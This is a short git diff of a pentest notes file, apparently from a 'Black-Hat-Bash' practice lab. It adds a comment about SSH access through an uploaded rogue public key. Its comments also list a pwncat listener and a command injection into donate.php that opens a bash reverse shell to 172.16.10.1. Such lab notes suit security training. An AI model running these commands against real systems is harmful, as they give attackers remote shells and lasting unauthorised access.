@@ -15,6 +15,7 @@ source "/home/kali/Projects/Black-Hat-Bash/pentest.sh"
 # 172.16.10.13
 #   ssh backup@172.16.10.13
 #   ssh root@172.16.10.13
+#   ssh backup@172.16.10.13 -i ~/.ssh/id_rsa (uploaded rogue public key)
 # 172.16.10.12/donate.php
 #   pwncat-cs -l -p 1337
 #   | bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
